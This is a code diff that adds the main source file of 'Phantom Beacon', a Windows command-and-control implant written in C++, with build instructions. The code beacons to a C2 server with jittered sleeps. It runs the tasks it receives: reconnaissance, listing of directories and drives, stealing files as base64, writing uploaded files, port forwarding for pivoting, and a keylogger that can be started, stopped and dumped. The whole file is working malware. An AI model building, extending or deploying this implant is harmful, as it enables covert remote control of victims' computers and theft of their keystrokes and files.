@@ -1,0 +1,310 @@
+// ============================================================================
+//  main.cpp — Phantom Beacon Entry Point
+//  ──────────────────────────────────────
+//  Beacon loop: check-in → receive tasks → execute → send results → sleep.
+//
+//  Build (MinGW-w64):
+//    x86_64-w64-mingw32-g++ -std=c++17 -O2 -s -o beacon.exe main.cpp \
+//        -lwinhttp -lbcrypt -lws2_32 -static
+//
+//  Build (MSVC):
+//    cl /EHsc /O2 /std:c++17 main.cpp /link winhttp.lib bcrypt.lib ws2_32.lib
+// ============================================================================
+
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <windows.h>
+#include <cstdlib>
+#include <ctime>
+#include <string>
+#include <sstream>
+
+#include "evasion.h"
+#include "crypto.h"
+#include "network.h"
+#include "recon.h"
+#include "portfwd.h"
+#include "keylogger.h"
+
+// ── Minimal JSON Parser ────────────────────────────────────────────────────
+// We avoid pulling in nlohmann/json to keep the binary tiny.
+// This is a purpose-built parser for our specific C2 protocol.
+
+namespace json_mini {
+
+// Extract a string value for a given key from a JSON object string
+inline std::string get_string(const std::string& json, const std::string& key) {
+    std::string search = "\"" + key + "\":\"";
+    size_t pos = json.find(search);
+    if (pos == std::string::npos) return "";
+    pos += search.length();
+    size_t end = json.find('"', pos);
+    if (end == std::string::npos) return "";
+
+    // Unescape basic sequences
+    std::string val = json.substr(pos, end - pos);
+    std::string result;
+    for (size_t i = 0; i < val.size(); ++i) {
+        if (val[i] == '\\' && i + 1 < val.size()) {
+            switch (val[i + 1]) {
+                case 'n':  result += '\n'; break;
+                case 'r':  result += '\r'; break;
+                case 't':  result += '\t'; break;
+                case '\\': result += '\\'; break;
+                case '"':  result += '"';  break;
+                default:   result += val[i + 1]; break;
+            }
+            ++i;
+        } else {
+            result += val[i];
+        }
+    }
+    return result;
+}
+
+// Extract the "tasks" array from C2 response: [{"task_id":"...","command":"..."},...]
+struct Task {
+    std::string task_id;
+    std::string command;
+};
+
+inline std::vector<Task> parse_tasks(const std::string& json) {
+    std::vector<Task> tasks;
+    // Find the "tasks" array
+    size_t arr_start = json.find("\"tasks\":[");
+    if (arr_start == std::string::npos) return tasks;
+    arr_start = json.find('[', arr_start);
+
+    // Find each { ... } object in the array
+    size_t pos = arr_start;
+    while (true) {
+        size_t obj_start = json.find('{', pos);
+        if (obj_start == std::string::npos) break;
+        size_t obj_end = json.find('}', obj_start);
+        if (obj_end == std::string::npos) break;
+
+        std::string obj = json.substr(obj_start, obj_end - obj_start + 1);
+        Task t;
+        t.task_id = get_string(obj, "task_id");
+        t.command = get_string(obj, "command");
+        if (!t.task_id.empty()) tasks.push_back(t);
+
+        pos = obj_end + 1;
+    }
+    return tasks;
+}
+
+}  // namespace json_mini
+
+// ── Command Dispatcher ─────────────────────────────────────────────────────
+
+std::string dispatch_command(const std::string& cmd) {
+    // Parse command and arguments
+    std::istringstream iss(cmd);
+    std::string action;
+    iss >> action;
+
+    if (action == "recon") {
+        // recon [path]
+        std::string path;
+        std::getline(iss >> std::ws, path);
+        return recon::format_human(path);
+    }
+    else if (action == "ls" || action == "dir") {
+        // ls <path>
+        std::string path;
+        std::getline(iss >> std::ws, path);
+        if (path.empty()) path = ".";
+        auto entries = recon::list_directory(path);
+        std::ostringstream out;
+        for (auto& e : entries) {
+            out << (e.isDir ? "[DIR]  " : "[FILE] ") << e.name;
+            if (!e.isDir) out << "  (" << e.size << " bytes)";
+            out << "\n";
+        }
+        return out.str();
+    }
+    else if (action == "drives") {
+        auto drives = recon::enumerate_drives();
+        std::ostringstream out;
+        for (auto& d : drives) {
+            double totalGB = d.totalBytes / (1024.0 * 1024.0 * 1024.0);
+            double freeGB  = d.freeBytes  / (1024.0 * 1024.0 * 1024.0);
+            out << d.letter << "  [" << d.type << "]"
+                << "  Total: " << static_cast<int>(totalGB) << " GB"
+                << "  Free: "  << static_cast<int>(freeGB)  << " GB\n";
+        }
+        return out.str();
+    }
+    else if (action == "whoami") {
+        char user[256], computer[256];
+        DWORD usize = sizeof(user), csize = sizeof(computer);
+        GetUserNameA(user, &usize);
+        GetComputerNameA(computer, &csize);
+        return std::string("User: ") + user + "\nComputer: " + computer + "\n";
+    }
+    else if (action == "portfwd") {
+        // portfwd <local_port> <remote_host> <remote_port>
+        int localPort, remotePort;
+        std::string remoteHost;
+        if (iss >> localPort >> remoteHost >> remotePort) {
+            return portfwd::start_forward(localPort, remoteHost, remotePort);
+        }
+        return "Usage: portfwd <local_port> <remote_host> <remote_port>";
+    }
+    else if (action == "portfwd-stop") {
+        return portfwd::stop_all_forwards();
+    }
+    else if (action == "download") {
+        // download <filepath> — read a file and return its contents (base64)
+        std::string filepath;
+        std::getline(iss >> std::ws, filepath);
+        if (filepath.empty()) return "Usage: download <filepath>";
+
+        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ,
+            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hFile == INVALID_HANDLE_VALUE)
+            return "Error: Cannot open file " + filepath;
+
+        DWORD fileSize = GetFileSize(hFile, nullptr);
+        if (fileSize == INVALID_FILE_SIZE || fileSize > 10 * 1024 * 1024) {
+            CloseHandle(hFile);
+            return "Error: File too large or invalid";
+        }
+
+        std::vector<BYTE> buffer(fileSize);
+        DWORD bytesRead;
+        ReadFile(hFile, buffer.data(), fileSize, &bytesRead, nullptr);
+        CloseHandle(hFile);
+
+        buffer.resize(bytesRead);
+        return "FILE_B64:" + crypto::base64_encode(buffer);
+    }
+    else if (action == "upload") {
+        // upload <filepath> <base64_data>
+        std::string filepath, b64data;
+        iss >> filepath >> b64data;
+        if (filepath.empty() || b64data.empty())
+            return "Usage: upload <filepath> <base64_data>";
+
+        auto data = crypto::base64_decode(b64data);
+        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, 0,
+            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hFile == INVALID_HANDLE_VALUE)
+            return "Error: Cannot create file " + filepath;
+
+        DWORD bytesWritten;
+        WriteFile(hFile, data.data(), static_cast<DWORD>(data.size()), &bytesWritten, nullptr);
+        CloseHandle(hFile);
+        return "Uploaded " + std::to_string(bytesWritten) + " bytes to " + filepath;
+    }
+    else if (action == "sleep") {
+        // sleep <ms> — change beacon sleep interval (handled by caller)
+        return "SLEEP_SET";
+    }
+    else if (action == "keylog") {
+        std::string subCmd;
+        iss >> subCmd;
+        if (subCmd == "start") return keylogger::start();
+        if (subCmd == "stop")  return keylogger::stop();
+        if (subCmd == "dump")  return keylogger::dump();
+        return "Usage: keylog <start|stop|dump>";
+    }
+    else if (action == "exit" || action == "kill") {
+        return "EXIT";
+    }
+
+    return "Unknown command: " + cmd;
+}
+
+
+// ── Generate Beacon ID ─────────────────────────────────────────────────────
+
+std::string generate_beacon_id() {
+    // Format: PHANTOM-<computername>-<random4hex>
+    char computer[256];
+    DWORD csize = sizeof(computer);
+    GetComputerNameA(computer, &csize);
+
+    char hex[9];
+    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
+    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
+
+    return std::string("PHANTOM-") + computer + "-" + hex;
+}
+
+
+// ── Main Beacon Loop ───────────────────────────────────────────────────────
+
+int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
+    // Seed RNG for jitter and user-agent rotation
+    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
+
+    // Initialize Winsock (required for portfwd)
+    WSADATA wsa;
+    WSAStartup(MAKEWORD(2, 2), &wsa);
+
+    // Configure C2 connection
+    net::C2Config cfg;
+    cfg.beacon_id = generate_beacon_id();
+    cfg.sleep_ms  = 5000;   // 5 second base interval
+    cfg.jitter    = 30;     // ±30% jitter
+
+    // Parse command line for C2 host:port (e.g., "beacon.exe 192.168.1.100 8443")
+    if (lpCmdLine && strlen(lpCmdLine) > 0) {
+        std::istringstream args(lpCmdLine);
+        std::string host;
+        int port = 443;
+        if (args >> host) {
+            cfg.host = std::wstring(host.begin(), host.end());
+            if (args >> port) cfg.port = port;
+        }
+    }
+
+    // ── Beacon Loop ────────────────────────────────────────────────────────
+    bool alive = true;
+    while (alive) {
+        // 1. Check in with C2
+        std::string response = net::checkin(cfg);
+
+        if (!response.empty()) {
+            // 2. Parse tasks
+            auto tasks = json_mini::parse_tasks(response);
+
+            for (auto& task : tasks) {
+                // 3. Execute each task
+                std::string output = dispatch_command(task.command);
+
+                // Handle special responses
+                if (output == "EXIT") {
+                    alive = false;
+                    break;
+                }
+                if (output == "SLEEP_SET") {
+                    // Parse new sleep value from command
+                    std::istringstream iss(task.command);
+                    std::string _; int newSleep;
+                    iss >> _ >> newSleep;
+                    if (newSleep >= 1000) {
+                        cfg.sleep_ms = newSleep;
+                        output = "Sleep set to " + std::to_string(newSleep) + "ms";
+                    } else {
+                        output = "Invalid sleep value (minimum 1000ms)";
+                    }
+                }
+
+                // 4. Send result back to C2
+                net::send_result(cfg, task.task_id, output);
+            }
+        }
+
+        // 5. Sleep with jitter
+        Sleep(cfg.get_sleep_ms());
+    }
+
+    // Cleanup
+    portfwd::stop_all_forwards();
+    WSACleanup();
+    return 0;
+}
